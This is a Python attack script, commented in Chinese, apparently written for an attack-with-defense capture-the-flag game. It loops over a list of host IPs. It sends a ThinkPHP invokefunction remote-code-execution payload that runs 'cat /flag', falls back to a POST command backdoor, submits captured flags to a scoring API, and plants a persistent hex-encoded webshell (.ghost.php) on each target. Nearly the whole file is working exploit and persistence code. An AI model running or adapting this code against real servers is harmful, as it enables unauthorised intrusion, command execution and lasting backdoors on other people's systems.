# coding=utf-8
# awd自动化攻击脚本
import sys
import time
import requests
import json
import re
import os

def loadfile(filepath):  # 加载文件
    try:
        file = open(filepath, "r")
        return str(file.read())
    except:
        print("找不到文件：" + filepath)
        sys.exit()
##########################################################################################


def rename_file(file_name):  # 重命名旧文件
    if os.path.exists(file_name):
        get_time = time.strftime(
            "%Y-%m-%d_%H_%M_%S", time.localtime(os.path.getmtime(file_name)))
        old_name = 'flag_list_' + str(get_time) + '.txt'
        try:
            os.rename(file_name, old_name)
            print('Rename file success:' + old_name)
        except Exception as e:
            print('Rename file fail:'+str(e))
##########################################################################################


def save_txt(txt, path='flag_list.txt'):  # 写入flag到文件
    with open(path, 'a') as file:
        file.write(txt+'\r')
##########################################################################################


def hex_shell(shell_path='./shell.php'):  # 将webshell转化为hex
    shell_var = loadfile(shell_path).encode('utf-8')
    return shell_var.hex()
##########################################################################################


def submit(ip, flag_text):  # 提交flag
    try:
        # 构造submit flag 参数
        submit_url = 'http://192.168.15.80:19999/api/flag'
        submit_header = {
            "Content-Type": "application/json;charset=utf-8",
            "Authorization": "1b1fae078083811a61e7794e8320755b",
            "Connection": "close"
        }
        # json格式化flag
        submit_data = json.dumps({"flag": flag_text})
        r = requests.post(submit_url, data=submit_data, headers=submit_header)
        submit_re = re.search(r'\"msg\"\:\".*\"', r.text).group()

        if submit_re.find('success') != -1:
            print('\033[0;32m[提交FLAG成功]\033[0m' +
                  ip + ' --> ' + submit_re)
        else:
            print('\033[0;31m[提交FLAG失败]\033[0m' +
                  ip + ' --> ' + submit_re)
    except Exception as e:
        print(
            '\033[1;35m[提交FLAG异常]\033[0m' + ip + ' --> ' + str(e))
        return False
##########################################################################################


def backdoor_attack(ip, url_path, method, payload):  # 利用命令执行后门漏洞攻击
    try:
        if method == 'get':
            r = requests.get('http://' + ip + url_path + payload, timeout=5)
        elif method == 'post':
            r = requests.post("http://" + ip + url_path,
                              data=payload, timeout=5)
        # 正则匹配flag
        flag = re.search(r'lhsw\{.*\}', r.text).group()
        # 打印攻击结果
        if flag != '':
            print('\033[0;32m[获取目标FLAG]\033[0m'+ip+' --> '+flag)
            return flag
        else:
            print('\033[0;33m[查找FLAG失败]\033[0m'+ip+' --> '+'未搜索到FLAG字符串！')
            return False

    except Exception as e:
        print('\033[1;35m[后门攻击失败]\033[0m' + ip +
              ' --> backdoor_attack()执行失败 --> ' + str(e))
        return False

##########################################################################################


def up_shell(ip, url_path, method, passwd):  # 上传不死马
    url = 'http://' + ip + url_path
    try:  # 判断漏洞页面是否存在
        test_re = requests.get(url, timeout=3)
    except Exception as e:
        print('\033[1;35m[测试后门超时]\033[0m' + ip +
              ' --> up_udshell()执行失败 --> ' + str(e))
        return False
    if test_re.status_code != 200:
        print('\033[1;31m[后门路径失效]\033[0m' + ip + ' --> up_udshell()执行失败 --> ')
        return False
    else:
        # 执行命令 system 写入 .ghost.php
        # .ghost.php做hex转化
        # 参数[a]  进行写入不死马
        shell_hex = hex_shell()  # 获取不死马hex字符串
        # shell_str = "system('echo" + shell_hex + "|xxd -r -ps > .ghost.php');"  # 构造payload
        shell_str = "echo" + shell_hex + "|xxd -r -ps > .ghost.php"  # 构造payload
        try:
            if method == 'get':
                data = {passwd: shell_str}
                res = requests.request('GET', url, params=data, timeout=3)
            elif method == 'post':
                data = {passwd: shell_str}
                res = requests.post(url, data=data, timeout=3)
        except:
            pass
        # 检查 .ghost.php 是否存在。
        shell_url = os.path.dirname(url) + "/.ghost.php"  # 构造shell地址
        res = requests.get(shell_url, timeout=3)
        if res.status_code != 200:
            print('\033[1;31m[上传木马失败]\033[0m' +
                  ip + ' --> up_udshell()执行失败 --> ' + url)
            return False
        else:
            print('\033[0;32m[上传木马成功]\033[0m'+ip +
                  ' --> webshell地址 --> '+shell_url)
            return shell_url
##########################################################################################


def main():
    ## get方法payload ####
    url_path = '/'
    method = 'get'
    payload = '?s=/admin/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/flag'
    passwd = 'copyright'
    #####################
    ## post 方法payload ##
    # url_path = 'index.php'
    # method = 'post'
    # payload = {'pass': 'password', 'cmd': 'cat /flag'}
    #####################
    ip_txt = loadfile("./host_list.txt")
    ip_list = ip_txt.split("\n")
    rename_file('./fail_list.txt')  # 修改旧失败ip列表文件名
    for ip in ip_list:
        if ip:
            flag = backdoor_attack(ip, url_path, method, payload)
            if flag != False:
                submit(ip, flag)
                up_shell(ip,url_path,'get','copyright')
                save_txt(flag)
            else:  # 原有后门异常后尝试利用不死马
                udshell_path = '/.ghost.php'
                udshell_payload = {'pass': 'shang',
                                   'a': "system('cat /flag');"}
                flag = backdoor_attack(
                    ip, udshell_path, 'post', udshell_payload)
                if flag != False:
                    submit(ip, flag)
                else:  # 记录攻击失败IP
                    save_txt(ip, 'fail_list.txt')


##########################################################################################
if __name__ == '__main__':
    rename_file('flag_list.txt')
    try:
        for i in range(1, 100000):
            print("\033[1;33m[开始本轮攻击]\033[0m" +
                  time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())+' --> '+str(i))
            main()
            print("\033[1;33m[本轮攻击结束]\033[0m" +
                  time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())+' --> '+str(i))
            # time.sleep(60*4)
            for i in range(240, 0, -1):
                print("\r", "下轮攻击倒计时{}秒！".format(i), end="", flush=True)
                time.sleep(1)
    except Exception as e:
        print('\033[1;35m[主函数执行异常]\033[0m' + ' --> main()执行异常 --> ' + str(e))
